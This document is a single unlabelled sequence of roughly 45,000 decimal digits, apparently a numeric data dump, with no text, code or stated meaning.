415927560524224880213431371862450391262084967108422854163814471096340223541462850695511660729756175574393969528067141121991371884824927943637619445332664512805181079870559652144919130732517137399110277013019089957944943566606177264923080839126522492755570067062881225920475703340309175605877681163349917715787613565455505424061400853401531090867059262972991280805039160740960606219999354168348386280920357836083015078152681249493264593721479780822707764844739674282815567069442929567188171822014701785522539988065585090454578270749292734074116911942253537351361884354529859136744852657060103977671649884769303809306877789858695316097738229159334836743430415589791588181714270981902707299094002648853535620024204705704969891956219576984766357328111827921848522596035594098448922059336215450834773754029434943077812865175144887292639626068453263914348431294374007873161280953049804195441340080487331031075125842577879035173431716476841650884177872223277624725216505671657950028232228080731334544701603705290278404493561719150647566896152359408263136135699882923918160352060981631905815884309710380757555941378413511640270113142813549497493146662166210696536027445708840589055671495435198440088424395226706030378603702067002277664001732487722228595105637270947510544601004168368004070119406186102223273233933651872859760435725884903708108236856760239221573885684965708168890284526403660899493656359671815973904354319269070334832974731605105176516920495316978123776512879249019300397045169413642387379994047527815054536648555137330183081763689918895181839237292173815528168971938198740859847440012244668692039746403044598864032218838062463388303918115260266772789994729165378163800246616298645783558409696865675914901024269077404564020267596772636108509967130528705907010940056425137504911684598836755659539592554925187699696589189002623068303853281650645813296236864967660505650428337925867020902372324183636960330570650865652808346508263852903084171225638068805515335826391699357354071752529721831709017719031637818235364062873641786156422113899486923732885215554505319309252193698811429863501483304747108298596067176204258083954604896966119064839440590233367273323777980814203393471828228616041853231857790874497835946943872882578564363983423258929213436039582802183323703455218132025594334550733134904745492909839197646653221257917322620666239598494445794199618617652596374196534552013784182777132909131526251694083196109051941676272607426863899261254221887641516036785404015693648941466215648018955781968996933762035898958632598146973870757850774321034285147840731038997706172329458202383065754304223478184996531730664201148994214063686413478827516061101553141961020621981599517327999853372370117886954756372680047809596072536742224950650499146395311392147511328797626496821846554820615255307843576742529351406815568889351192193853968462505035475290977240014187809722474795688984142315297038124254023073436643551637940751950400583457020276201385939359442750438580061423674057646567734268513552787266915593801175032040539956441625945226266108969623342487887760912401379239533588192032232175942105118280521142499799832556284232630720073111519684143780484677843094688898737348952935993807073894044872641145522336687025871211804892532542127722403600577800706968022590227857687030305854537406735292458440851391358864449676925978005195384343105733126156298887778210840223662925916885194745421707280761182684408915112500453293986998468045635253533825646639761658505127730334661038913831812425596847787965924666487364449855304246481395935149896272840153598414182036409638825856220179746293122282584215961897532735783615897051294882614791987785212266520517202129081094449405743123833799875130339499470097362549733177377730018648165728279849996009544373788141003638140220809163194722058063043070478852711852962907982756868076715977150742528079769772053302041209349390172779044780732097558129668580046435603114250949259974822012878283323785261965048578467627517054975291670240644701815581283949018780966167052538330354862354654202982184281418799971700681161876512649645771602074948502844006371727090082361960986148388777786960960115686233890524066516715603872279966310346193325880776733020864803552282857145305572612895085437926031680125861677183590052173965435245583256413820732378464258393358034281819701448593844992397474705750152101323851954322092525559249202881967969404636566482489159720302415114701378921518269418642795078020287197594364974613958054139919080200180811065914946510942853800413483207246947920346514903505450504983728392303664550194906879234331744688807724228539331592992483665027296343955693539352508914910445849308596119781976031145192936958271320452653403919032131012970267045706622885555708737912047531075579113401471188585639141030442312994107984009223243317618010960856061433359717835676499452155603054272867112298147855313542520822977891597878674810239655134692853761810778133406988231309309478869595211543902531551106030606084503317087085245186548741471008055105268320624035139226883818262501086185612348414862441479161829194555385557749254387034128117574656033092271673323903566283709372072112081016354176435917093092462705533920694852071276269796138926877995824170524308701752534961161731190472479392803401514580070899997002735519723121314557745156818380766851483560947491547785786071915644009828042892949121997861431183214473221984377899121867860424113945917888828625365797704782207869436130873805173105766224647106540655238798398697685145510224705158930081867852360262269030257877692959833602342902571352584391386055314712670521815271696555112114807041422774801808281774618224581554791388369330681536254238716692355215155039844512208332255174400858641744426825572381259907040227836892862039439831482608904817493244069888681352650732340585048918793356493236001722491399207937085451764801378892796250636988831586139564063067539409468241067075054563239555555644471253612684478026104109630426560105901620114843255294321579244681641841174688936812404834584261833944969622828393546705120686220549773711621921191394938622763092447578490673731049533609361679757133385970095390530908491731976743619803215211751249005420655138837637655281810280544502920502638442159093086519756519606199265785095853570655923194629620011803953330843167365408222293316393479652238256929782217825068020827265610508471095660242191133238109981272155150055094723160030513787025689871108616032459394530279225032913715922698933780262496496625355932983387496391773050867358396773906213288381654289912071153550712400274867502638446836475365533895230961581744743186712516329651581101034456237623710076622159845835770038181477244602716829045166681756081124535440079586083951078847034321412414472421035612913569533362823093634925054562295722701154056694818392113811853095175140147285672392877965122598242020484822378397038966941533617300484262400687073145096526472165460371119222312445984706824145584631294646796088498154680939348402862351579137418727853830675500523456538145614994705695786485613497264058382935500591056643956833510298900943941716849609497777357268573263749775499969417834746421282192495870868646380521802532407247889447477646989865781331730537347895621902075409682292539158080367478482926748808619846076532937569614232716513749613314434999424579319696455498472095724825085272239686309616061425576016123767807672628038765080237677035497347394014643467756363577153412892856146089516389593374990160964813921155928061678037939068288895693103336879412304596547610858774233571141527700983462834942314403689174089665660878302240650337490859242798266562664756955670401157751725324388351364323234410784834637798367389307103457695735571100044744534496767297480890292903253991584380684387581131690073996893946851146633304723802575810420694698414222496435801159723123263246770865539724101718255251997190135048876491308488251756326917851918317405597067375505287974878147291498417323591526781441382352564498960803176915981489167592403242676938779287618074953967821844909706674888946952308138398642495388073053309674065175684626779273240969345285461507387106181140079222769425456473001950997141032962514517425423685365468359806849632781444286000549045098703825637346381454212920524534531118578450786084214428120800975254942003123720588534032236073783573657040426893488001301937558827180549503550256245050962853319562322338573179559829625794081876424294242726338690099515014779369921487588934426347319466788798934901515472170016454209515691691261999819549721655534209679590459084339348233866264782323915677941217273293948996045830501594227466824029621809030268547811692531502041043444249628534476843122740489789758007409534420637060460008012225539400364245188976990250326976098171333103844061795405723080305770580106185099800417181777029097527280559638736837245251718834309886865331238250302037577990260136854040401778416445753473647958561027753387571029612397395347769953161254888256426867208966743467402872493267363311276136438027295767921378551076786928235287757401901453136421333062877311067772108360320398185668804031074722790760834671507473561311037735856665824812702624320180581522138250724875023315052811680218957630093710271434249694345044664260074563460354793533560046358414219610801837682275005139911988575599976266840000046597394950842124510577076496689119063816392477888204054953833140977943585898418617706740499116626773667744647049290288900627428207756319148761919079748038692082366702307028644798961111234990767169070584272498521816651205867703651313560671176810595642383703986592008619605960389686450034817651111374668798161361048943866060287330388763364391452502018355730463561268041663303976920659653692667732577828765863594250968384633588563579486331959676869647432541168103574050623755583666098331865379079884825628187991593907626915111556024579639359674222954857435117884816402788959646199779531113195486298525750975923751092174098260015779485403040204355276650827374111266304665728513118374588196483402318713470916348211960278295090732722616328656933231694027797622916465466547519020071225345268602006103333329525144343732834720491765355770337557109341942904799967941034439919992972430310637523897651419009829977718431034388175077983085241068759857291852802480887022478192632162153873645676129164624668189925955502320864330363288406931404428471002116703164656053892183486962679079137516134370147850550047824304220148464192447255321640993491152957568835757495760088364696956920540584502096471566450434874930266531283388546763158333371645171144770672538233263849023977875395671758697787450457717320488227939724355585389522379447976273569114947176837421979637076485811343589353956441336772616768125086397863893326700198279063548151834514597120511594378176065526905117338425537864718096533326456595071840896853364577550088202861968912292506936454726036821391920635747797659239354345822507254395257245503497553075841969305902510279865819776223022449047030131798399183545332302471719005885264895738227776871488105338024165932314251526596841216645225330056566458711006794637707351497010120218847585560716440524361599170694056771362978528667036446412342633385055294094989345795804504721996797526084291214792881115872289584523541067259294214698981322975033422396440789525332869277787832689358437546859073002426513186640769800241957508263592590994036647224210961497158811682404881999572474840774153130949339179352457893454379049638764211890904712737596242972310544373194250864569411522383361532554907550132194659729592383131979127296519478481751887665220795656132708645130173277935822555042885786246569175901278514761478507696801962194200127713029098029051241861462555282056431556685153034117510262273952503549471741130489094989547534737697196454795577269681138395352743778693642269045855645121364984329505031315631604713159365655331556643979812329523658010067238621751978736753869230087281134810408383829029117535479927429105805544920851547531401670559382143836288699367906995606672780150117848458632623067527879492661897573486635389169164331569978662426904206221052714507634767452499052410670557416443006515330998127896906005260496081623807059441302784925830477359628054203138441354322289019115623440273262925075489181413393392440347576827172275250744898388855553154380911585722485053302296303067986976778290941413831741388322675139975394504936709458553328641516785664429334881090878909940177339666657339979568944703637027523334773656484588175377751156995077382819225741970866051026951741662416837223534448784790764936802000769587126244029811399062168067633975933076260126212736120142911456652510371643030274341408283977474145514542956079696582656681754345076762558602191694052420944358124830198029456216713042890616604014644417171942706369005704049136102528637583839392633935855547316105380361820944181465602740926288020699444598653260237216645010301983037850537387724429868268058164307632254985605332655197243361276063013285083883982295384080025741306741647124995132056242637283833522611908830694921452762384708145273415135424849960567053577551409445738277929276419040462486840779619469740080618207140081437510839203679799222375278169666540901467774565625828265884894321139735918313334125707784924877499278790001764615682724719953609770287797026967019992477628935678114574870299917144231991493147049135383609177163977665662680644442049793320800911118431439836198588564201397652425723845007578132991911787732223098846077961784272193860675682740481647390757042521402684311180356823242519297345477804117698682852956289703412018878336740295996656412897947094560968613552783315413093239194089519159907939423118946065901540481614255829261358230197345184722932993588865547499400751999782309863678321669280401081201211227648336883716890723924212095151186892101307081459752509435229479837083958129882179536476980307390815312649666775784805337257994343930947964584863069904549741851005240902525007011484436124801427701424367006534527962913826615983464312767038113988701528383411745750748001934991044128205882536644119231242736658972181119128444937384664357410454235687244499690321841822671684721588594337776254976291150986419404665026520857813383270312564074904937915196715562392716849657194085026221451828846417143483695955714846275008354411919403579195652970080992191910333921095413959544678484975539241249291950206479802416007572097197974175128848110518420254676574712738901424112117396898257672960016943250246044173440165337910459780341579778141407939534148832462902586239916977787853328218150782486151941241773229065875002489347085823002564131846349756511339750662857648263038320041162833555286054115482678569328390081177408457876395156155017830734880859960433218947519708654879502261490599280304711011012627536626262387114002647577382402600356600298217415315047580742165429509507945754499362811689253038935722928829396764813339099519035499969055261970406249542032557624565573528734422111213412198593410808999091752234450540075765241979448833547104399223734550017432120493038711081472568191116381662746640814009822525902391369702794037640612185820061370384007210064646913177939063806335908766104069007408485080640663654736544591233288213924180975135763267073586278529103473491637222965478070349215202519256481628490931030418945095018322386095781565909653939347232765321160522906887639974829726519024669567442450175852200868889003455603697317294269047932172307031091674099725804667953091792301018596434529313992396293087962932320517036351342359054662803297149654231334365818740375128173844138888116981439265328240575038835895023180191332665622227392351841512849839929876950311992455051777266824340491736700681280548813381261268351099983654564346172025159861127745334795497730772202564474249497229298661731361341786611697625910167291018453750647437305596592071701960913086059411796201105265519910821218197847721522375372892587744516793951486699661979578054029088585679002202205695225794838156576630770239341504095700831921255490806122162345252889280731913210800376921154024534297601187626683259508241871124882353662217127497573899757509205344902007527230465070785317579059412021141025837623243102662072000569148744977443081269883376805973476278502561332346774293833646234412032640772580398359629763430725383829711028045583387893823368854966536423632586022565001042857990318907541495239925118131356418509152783801840690261573532214918861978158379537750043512761875992074717987443246425554208597809530401704309308904943245038207259494797266116784811327736771702938135289442844030662175585254271418796818283856116721001914550220220184208725988276735784726886611886113862101998852949855782971733597563041377220578954456000247905690768012481685866818672775965800402818666718014919833621158660402525909427631034547216837857495858468108188854698392274449953145547237349621556377125430848478371070017957302834396910305641411759910865132484605017234140851679499123134958004532556857637286872604158328460422016644789792111899444326139154239404986335415312971721303514979386164471545940475245253163837602529408589846991866841078887990140872839464708592854040417721103318369685125191356921562521679642382798166819555019461723134415565787411431930785044606724394514242887317498175993658543521693193746967016385422847669710488184925508126947987223142008993457083186146862349648192929748256302661092173927224114991879611677720798369066807985862838983762911814402671905495529970949921470403800383792537084149496289479031197039317076528033512294802714373364321686338812347139286275550814873894270680494387140434441033907709702888057067477619764849610902179118810247870993328395459335648023605236840746183356129747600937800805120843336080576673829655718977312291686424760758879811479305250188226999862252559564490786804417140176148739969222220309155558139893075997003867228866988967398366349937938053306029402350588976876858561295773714637407641030893337822116329777520035136962610387266280424285581285056291295674356169253688340781777146287993887524023271888160292802722553153514634604842867252636376966088551035731757519041070116412318433197211291415787148193525459585703807030763104965000270725248988491302319026904656646850794686568373996661118845259036084409579754094709639240479983102213779556748744312789465775060735877577156027995856652387473662629322450874225042497674777934319293832452712881874256018603404483148440613033293439578152936961385232067840322840520532317020414143042071531651244816092534859871291504265045209270998240541609347342536755686276496430707645706123401317796877824912581778864851272840225771429354446683252274766088368903093579774388663520595649618936910125393047732976680382898432087060104132746583627454450782630805301101388053796546272961588451518239461434100615978817642738368814957276380335562156542283175947582230922018424433762050649825887386896002394131800166054013546509528480371178123628104599605347402589516545656582656827722675261249802499063153585458175861972676029644735996319092891956509072168377771366006992529666549961746071644941571902125925578840630659517766311658246296378327129820645375261000151353049042904168788668613553633556662300979711211685933215421910278981407924286854053583222593856578156659536683768904146799079661948381361537981257985761951821413776430512757621851163544954617416472038081879059836648965722230752468316312648175854786153345308314169955012480495715217687348351220691156976551737438528630274892890790588700376208719808510619262205608387384238307902403882097575124751754209159949839186605100722319136847826766309082005255074727667031353832338770259742314565619839766955838791873260968471878951481705201069337209273804988985047072650256780724942204293083755260466383653012001920157710942383707485983998569822486437937406851442247658305354456129673003870711251797169579384331939112196099129383285846738464700716203010536535598676467043094783643279124942187112629337965436816753692734386855104647915035549845291397745535847867423395845349284488530163585572558992218587558708378569612132184179387382460160575373732208486214849701660115345672392042402866142007396008939672296725671859398154959693678364997799045302697703089648525970015974816748867939348508825003265986431489247013412040498586205380805204172349084207503964177235282015698817360742804224569994827977453625484080597994934188792301115498096417566200422813842948335836933673720913067358502294166000782599755902236332093444008370709378697353391217711106387801009084025349462952052931075086394023979820853529691863410867774918649660997873692791984792776300553513618019269007946594332291460427227260793179624914275062233905709161573436000077068255534040890162754427779238299441749065319734842420912470274198658723875212167087611248111729734332659187807814888620266485430350769005605734660297789425822015276341518817723622829302230096330999352236685881626715092543000784827916606422144149950935824720938636402062583797062439622876804391292583689678813207043890630448783800187376975549704400376861904942770089034934416947049635521967915826914629422809680800344729913797997559645476323688191514293671324196764874812240781960835647105524522702195515045224007522664602008550540165494876875570228025241370599789898953152154970474818458834354201416123167882671091837843930164844452447840567577296764510725440847932321411196462328910050800567860796611515140572590380806313144009026007829140143745602613895785171100661228899385501713539293682532034951355842727384280203753494005463869622688530563058357559158769933155476980887448382251705705446109023878629231541914533863148998788108927697859636897386210138881627639902063474437569341566647714358019668799727761234024029035800526970536759792588036380401143686738867110238281122705799748605399405634074908639730375655181037641245701601059606562547512994770832541781341796477503118862773454383172674341516319732702205415437418299441185700229712116864838665455029949593676953184688300198229294421247149321423367707828422307256514527787061047570016342782722309685580128288029339054966170076847235906331208991691374532432386703507692174478150477352666758554958525123408613991704253042974851763306330111352434812297693980676796682691406900517384624754181364514209652882636294807442694430175198756134560815740162587329736918729747071712709363732242144653453221968266575233096162820043529092619268862529652902678792957454712149948401031112512001082256356263089771685804544100135031805960299488898735936768972029738524673798597582858867109326525190357853110108748616789762451291948747983739686328810821389969481312290600099558351033882410769422545622963136249224731090175929919744331352096568067528577281908044760728488404717456845825697071800014587725325463297131811795375190828408931142609894992310637310539985635086173302667680832218309323547798633439871027018047617056990944169620971358344388535716644550815542720233820928525125823464374762240252041853650261601255005162965968018506574630292448455261934990014772509645900822784689026833781085295606266397651826086302353910117266109898636047515442494261228811812496321644564718169453930059158149020188643278548030478370719891297091831711703340514370910917425104605891363726702193611463961207106852934793132770586514597192346031708631379109586002305593552324217011972313023353860398653710978005932183484357596082422226317299124997907704073702537267579343330892158807069121024371289572720064060441183400864117918520956524557393173846019935440270628733177317814033328294511904538371781882271385734418449137499004365934710392937545125050631862212976233514343036838168451395743717401920354394400380444718597174032700370489773289063905522149206099319041946341062356148981196763632409579080061577909673186238069758732428694409571708495644321207400486785238185709275799810367468471684371757002960673262934696531813822055597178583150610018434499462931435446798247344451297868302756431312711118132113059062539376019949290765655977834568697964260975144335362103174937516417186714140557788698621497350320762925047510273969397114353265492619933989686662825591361369402147962654182518760658974395765796886273951688468220183986163631272996188719801283575625957713196854781922573350908802028382644415766226897078613524058508771843207103121768049972572378985462692979419431441449534268633036418607308892832203358439526298268258323426018560264663086366207957344071906116810980696937047188857068708565606867212198008299750484812928826505520991408472416976438661314588844055123153920216490822136624408136419467280765795629500257671548889380939205064950953380614197236342705349353846286117558311482081702466452541174058300095677561425049996071868246049435632296094746280729866528709462413943760094097231401877439553675132898401924020071303243745340181554402280470367815488769176281122866998464428826743222090853922514828411507878285147848851074246796347294134685544161014630861209385659161696268924932229759739415240175238180729656183179719458730376151438826791375992249586225208809786471038132961552529659473015807397482633383596897059886284326300198563458015925225887497212621434624545070353247872459745473446440185738109801953787858059313915198666416951023181829394703002843991362090212829682094434674120260262941925046551058344111138534223955621814057664029157127509835572452816701410038993099762273592628915729215969877048902682231996716854028223794454721639540831601111894166455169569932175499432235230457320463284610528969328654863451723931994120123447034492611089278412703476112797678102964905628745530133336955568182845977385856760034279842323091810201873301320685017554706728284304753258958579352688397646837517926746562292501848773761014657398649320699516588270564822541912451884802373432660101164848035512329069152931344155676796371541619809947899216458025181174547326397991886055756098137478555959837592841052358217079654846423707762022263115249065676702185833944119040155484407947995916933327510676058846759582364024349995649950116599213403968854389213795706207571570508540808274248147899873792156493230192309497760590590368221725396749455074800946463145512036600622354697743126496946766501070163428999165652291760087836278769353514194426893151304983055821125223125081461488174728109046603462658353329167217006257436365976984873584905384511324401689927697479242578396650690448246050524172645702795389256274197318942274694118857982776898339070127342966657251611599236481792517157386802753942504091691041147272310673808399978372714903138497329338266146902853145050491977796899207755437581613834193871030382918911015989157826984672790005417459264505765331636053556834713581138362933609480520590286958264972766025360994357330074911947063814133887057575823715845344896842601691728882087874926591941543543065706824579391506844422675658981741913502287571906108889273075770079598451369622473993209087939739108232100464497984418275672262718795978748950269029537740864134128625643780000250338701013583874468097039452007265137782700255771398542668514117826323701270704937663130783112137530253442086893055304201909545490825906510592501008728827674180502065940614667884114263365478945588034898778651026276525099317315965138652823790254143066616016584565125620015344152896640250369842167562359154004626075775026059570521207450747869009759988943559945428176915619095367359866634208095076488447964473589114496482035897810681472594287368137593363925052771623625210831084735067139340858343399367448609541285272194381831275526977020972550661074699632426953454868793761942720657112086751500631908184169450072755747016417904858279264829381310440138650715319295638403869369476795836923135134017324467493742257378751911561760445707404169631532647602373521742224718421155940903317176472411341105976657847396015131849948479020933498161284392447017791997277956849171317743777550103065140573834098748162060480843095363967830660582273124989772484860481394252395148543095328736158854083846232907101806342612565854651345930405066329087327706782150304054089346555825755531476709802663121240635201810268096148196474597618315081041185324771781293347118172879128153645286896694653620279158369241152119034647453914443369771553037478914106024365826214609141511793205434147912653561204725942339858468720950421089996351982848030975306369919928990675978494741516869254561141409543811434793150364096887791594607868451002784081341991572198826714706526798337909306754961102156881986710746488090450691459661163920864157174513281898604117973030962339539169938874173130617962395068652017397883111159579500124096635707057698082131027613032873851796841442430428555236128584654764618202828562658223716575184027911735917372601508517990061080235397091895143139097113078570346422724671790978648279555577048226597577597519088022420615318636883876393458161568931572875525246739398758098724092065295025425055218334074558662914156508058419616191277973579265062454374036055263488051245044066090324374350229658393817374772548348561536741611684113967877784898696149990577390858296200772065826561720595750628944521384882795400326647059672924559669206100607451634975539449120588880662223483177256347261964576069477515609033618557706548660581879028509972433931560184017714660600600764836981452469221003474909760953242354157494614883414799791164772297103778309486961868612077814992144862115590447209892278472051532316373090220780915101013335124232976755738471442075471354244464428664498677215198510786751778083671648789879761103496554233857022665516674042215282895159357551436751097239736891684534498162875926202314542522493383589450780890032925259925090433087710829885956366610448650358175036184513399106960112806593305344129521760300867356671558216714435646530869022336626335214947763970886506361902326262779248635385764275531708367234901459740241542408729042840177795326600034584478742814424544362832543701511316593735250018465966895365147417915060479901183355922459343797031993679067339056356761167538176368583861515629387983368175596918023499846145078342054430648341210732414909452479500418154058880628859980725133688288227435337873515369354385371159588938049520547270300741332572957276598070315529678957352472167453142597951633925796557803168961040659812803990536997151323170524994791988478195230920355949989093623520545340006269961994051421151102204429116078212168919504233621999864754007858263103982362054930092688251339034212939047768093007010440921597141100809733173393392310801305068710250126462914375622472295863526582366317822142840755230632984123244474060357098614512255435857070207139080117371193741084930892601059594443241191357815097836089734817976159827124560130093141710032191359284546268585679313128684931877133555116288727216914933192245365805121111161325547029368073950537755003244256223081789304219772775675247162947731996428489601731978771005720717937054571419964495016374029258263771968062183598930758821881420970522150589378310235632301641707013320289097133867473676632300589115613393470913875612734840751956532565970713372706618182863328312292762482420199718266662557546925469264982327339880197407147737277781829646952910876789596071776351050346260351811172994916327271703840219255175226528077531762681330588503485177761901593343336492619293315368666786400134825623063437139149861669216177765443011624671717873925593894992330568156310753915540175890583362056392137690573845704704143184049419636844240529800890787086832521888133100631128983701551782711416836889952491785847163309954587735883875030609716307433600548459268471106326735296090721492231713796655452386261961657808997366294956725236217987032254727764786356947216499051069159635032015034347929532736565181517968204015569231282252027592604333093213054970160540936125524829213899291916889635629029395881937514218226972524503694078521116380102312636637937275283923644806259522246292985199891041934644433163529785571613841914985359139493654658786975881939785403976130154174927925695786580415156778973308200900075589865183559230417235468767914848680209158901731803245412215911398964687881326280690101107527648255757569487615410989058960972787119439052591484732769575276807677058817028985249395919659649275350360944814262089346584147977555579674998645458097841089713157461347500276109535451482192276848984759174263693671337743072553279431406668289527351539539545309302048432786324181570595838875464085131722089337207566467483223819462220872901644513642528532523007782705718396016979534705570831317372207993662419959857178413831519892919853606485688212190124014951594605186851615425459863832454874571455973425995285674964130181421444492215299498788566757167637901459190780194318783619932063420053634900690049830429616573388779938549590124724889449436055411456396571478406864988964176766250919074617530885711842221737533403814935355247839140831738404618936751577077240061151357344558317788556903329798481981994841274532802213772602426484727635761126571218346200186270769871504072131010746312779280747171208122745804065492324980006408515526420334722086193339522400015490431636207261113739714047498447033009453729908237852034112679588726731807678065546144560147113016534319867307267056744162216103281839604505231739861079363008213070469068251629331690207561134978327647761922652573712297815629602620782733719039737444555557359158898313758460422873010727767675663962962841548161813157108013930170785646228382084553402758805779292198472064499729644742099696463502456676126054072481556672183280296353401332342255713038024038207478193995891569726866037377376341049255359777465407858597100857609620337173870708134846844076974128819226774289022927261139427215837004942904974653324897517562751724577509417290574573964272828822503418672702339438567801817503499029679296946620161775703713138028980239171011183302764868534565438068466001609738774032366535878572826413099529513970139287194595926823758365895503511734543595052652179693772757690186789817014210475825722967354656011710285850161281579858372057759444756084458725907238179289017478174229376822313022033946621162576261772929322291774912646184724140127449105434934014877987603766904450492654157054448812687567980187258243213728185812696992705131015384708873112022148962823000497802204806332890568444473715489320555520486734496288041089012095327274731089993104972107895832335374027225473064461311337237930691974019525911480453984936077077195027667475376456613177779861135243156903424692509789843935853022375998336102705512546577897465179028190681558435771856391412144025786468215089891589286119857261390314495280322964967878465100266462017337883158609197733179942053790688735534889956320945132654376214344342724275879279017911744054425808063093672617863038699253885066536694875206854940053065396578004039730868150314455307729408916594450256726637984618146881841708371167834107579655798371937973180784363368200662772130484966090886635166156782795952983029713771870610017314065844863474779419462713881767855018673740680778467899735478294819972030444733614392973406558619488319750781253873270360524695729741915457633121810920428630533761949223562639089734327637236122011949746418461964481439535023680588664006850168572710096355480792275556827144432502690568487797402461798500769527739033007821076819909816268620081952547672031961987581691230695666228095563297944336002398285786774752657198497093909544071050386682039133102714958642225101859972712507016821188948526214254966388047540031937369949417788092347569745669993891398689909644697311148188269315584627903227683234275271922237621157804801496986625337602808155944051017969719542001352705860656046861253986783845557282466387901574054018725024297249453675384934058495092068738970265225507604713812160112487026299273534300524031327266883917906801791059602023530354872011178150349733803736501526188742755891246802148751163315736583945336106484105291830659033009647539720214350982059454811335981342864102980517523674346402160440948489771506814870764524269398697542631920435330926054009986564013310525321892719895817886738060692958834634428157292631210545729115128489025416037903471947259690855881885930831075067418837809817610200079002226330214555403301817477381235036533665572078073769137070617428750123445084515414379652176568473541119958257146428905191225530198553846409966918730526511478841779709995883791445280519939806201529958631607629340690702738783502478014278042434873955172597338897848939464028035157916129991459362120119263187988317087984950012545106096996313729876043228588504061878197832414223485496141245051167915350507163258723724147156077011945930447638094057693717606591820571650350267876948219528288071316829525429553437899143666286685240594149218385715469224991719873350172745007832839104940453741314348858932246558885041301155508452854713153056150832245745867611954689582176631918377554308633314855270841452189673959849622644421063565412218401488984401198892252960002115957508883127874992689687388529164331879745635907136622956897995461452641566410831733134693831212176113150303121114164958447182871179509507111057181968727609092934664839671505591427266485783177865752504807443950291150716730050185096730496027426899719124628522420342879982744428725298043201243230111148446610295012153856529126857384545717129335512744510411305876703451313159605218445192921272016110712199452858313360224976836860515929233525017583274040756096102812651276349559234364632549086754429461707677474126562460106411533858992803327923275353429738058454516503234764986704150185463890220571199227556362153620528485763700448997894705749798236801056998805146023893964780624442347921386245462660466990973222720776288356323317030645836645694892121629986850593923896104550888915437681253194046869924341552747803707538469239118356879883795422703539810642900814778984731258181331689657367092328182966595099686783624025837374813316266588813919304844160698883926035438293077871588210489716765080992197621797310064672600756814221333548986720052893662686501441021115865932686473815932008214980365024483665844534241408591986203147284990454447036290512051572191359574929718378393262939749777861981514659073948707760653549232680908682861952523467536830203482365100330919949759981640597192922235760190559243385417024982361568043632033105752305851731436964627049629311727998267581220812548863051971038426734218480658884516359767162661050577418307466164975387997928168118482830190132030309527450145518338877317337276240655580395410545473133954316160330060300103757967703230662756463115170264274521663701982587679917998288319004334676511904155285302364490283381406970330402986560988102945055434179015914851894388790567618957932151708639836109790733881641298263363533945015258003356570360224898009001435169009486466855034887988620652353429687922921490394815530206979557557875739754835204237369325793904215084707290187115362365107718937731372662741126747980785331131470070940757334521590582013557936329654911997996227374574289540369972295794637418373894269605281863631289125942860196139470648931180135352318576164419843977420884770758587530788406233972605937671812373665682969837047528107091764139037170231185902119368338692233299264677523644061194431914719214584000212383451136960305287773882951766625946280821702124500502937161126857585982250945606580130141703047894652896538534345244709079033640844260219540806482752769028620804028938517015829213369219794105895435502205964743659529980812816554382770235613915414045054790377916505835646271613149034788422546147744404141399058488874771415002444203902136416949872375096796704966260406375882010675083721303709892341149426047855945783382297303538681308152577957164143849013499446240830363222300051873378212815828428017851427754257045736754932106517425922565919849253646452722631315087684818461712194415179126727782128825701738693295492747281614916514228510248185976173049979142504028431519528707637781621751528598945929432438571414275035863693206483733427697020197177966140011780127495352005554837808903003648575236741237771536304168441224097682483943607263047142904537957719201287195090372492138879761742236839675583024329946224462966584747441389154579246514166252401986002352056803207187704179143049371333434304268440018247008113591643166692473800865773534624323404638030925999687950484797832257360154124348078722691775746926025482638574804950190514097249935383283993992540778124009807969803835361288425042354026947658759941578702021397350324724477876834642573378836860786350499625174151551128974074169235520939753429541728485088094500206529307150802326376858555756269534335486650451277978104933749645356039298009245208782427666368567140406584461899816633389460688774408682434794985679356366630719624050390182536679248907031472185880306977150866196647253383630878944367345288203082974027895708970530803514706995215501618876375759704242263152240211025810197051673862649213106990282868941107804209572745903927412944283177234701158117150990451555679623371217754680822971403795678883747468962999737772293974120999979618558585131397212678838353363294198333124317501411372081561144454508267651490834214136099121158927471680636355871323483935517493438619510924957389722907711126658593615505412328913207723760106300729418961270935393553068709076791881756920531953424389178738528134976471180861766240126463869260989327297088505047647658290039856966846711764822425720520485739104235091977014638634317014583440367578582536221361051243056892850862303437918701255111734563063283078958222578770732067083930339258256142321443755819184461217194530304165532826020810559603630233979088775735870455570641125072744461278367122440703785626061914359490021557451264920866040870655280036654092545448867627712661981690036545487014732040222671660262965914913484609513621843843191744837025327833770735320994378030588692348388050157540745558783090377542919598844023868350264668816984890833805643724408429006647015813318522306593038600740123728893298971217691399415132529091982787053005567852264892869754814529709566690798275190300120637115423794551854832580669386621944884200286329219688365827111390550735409663996660347954318148244308345111710553852542398586813562881095228171125506490273909011628242348868675097727603200795966922249298423890054077351735208003156780725606965517253426892198435119756524313494272072306685230194468810927560693064614909831337651395763392824513114328561098171237085459291935765833124022615455938109769930746829875191027670565116300085228142610778168536636387363619999314952466401947605202272029500172885123873059218785892697263950876120517661461726092226303882857464632231288953257597367348814914454355788760785255118675214943875584110033916651705970730599655772370928512970244417258203870638148200569279531727627886191163616379540397751215701392774798200311407159355382756678381751060555352588102051230428194933868952446509351146312397445269081926097379897610780561294835437274748558390423178474820248398883414701024778473223794984459520999083801975246035071899956991974492016635613869055717199796390003720294053717500395491219348837393227278255618931455001216068995358844089828584527643162298959862831812318855292347437730207317657611978267894756441921504108113382900421371134052066272053510220023099945844154860092152497547187045756953344354311222679624830643642701279163245096485839087348451933223648701176824818673068305677957838453648852989826592224616436907379006132103400612642195358038541345732330090535017828222980326085987307432764323372657985759702958915480845248867743364513886103563441477935150419128980061643587619323458790587177653642914949673256157409379589610249761367747531335191840489567092441075381638059246235726819625879045858602394886765082797837953858111067962922674980311967501806337230732728180843694554062196550607022421835328187435339518954600275541328555402561902056520757082170992433679596161041809705023855899136129246981596375851001365750702480419900405687222411612903757210029119239295156446097553002441704359997839833966914786084430102670906427701286127822221849803375653163656836211736602900274883733113188547365159118518599442689054238322658505682560947226534440501780066006611714026072070196956218334028490674688881748852862747063906574030208083923598489930842345967541388554014972038159893596244715228853876616618949963856093599373496823777922119999695039376236888897112201094676508856995690224265638600756587944370439198437466328234621444842189171458790815273439631261255474243793391446946797342584774353042868663013457319982478884051452652955818123354249449281069245539150942971790055298115470126917666884484319493978882879798128468219017487610948880199808326255985577647423993755148514654266006987205031026770223855946847794088523631333097718846338426873290447097664404842484510743743440865452075901707647116935793839538705146960641142460453719481535525041535054339452155339197947803472093771159363650452194874922793453761477899875816756075522748507968287585080234461041430468046585204819030233725589085053880823915448419009423938551554914291618248339968899271746237891881895739291525283706857606653658502622075082830129484389201985940361184279380575705965624512735143584673464567488049573024124908410179965750322694975480679606772417062380879398727414977013074572785718845649907278085339315370857758821444728802759219262596782478013643588161624836352422372051539879467779169093181544386570987772001257584553963353596638543310617768420763327347857965482642361890027129666818909124689740045115223002154597551360075360490080892522059436924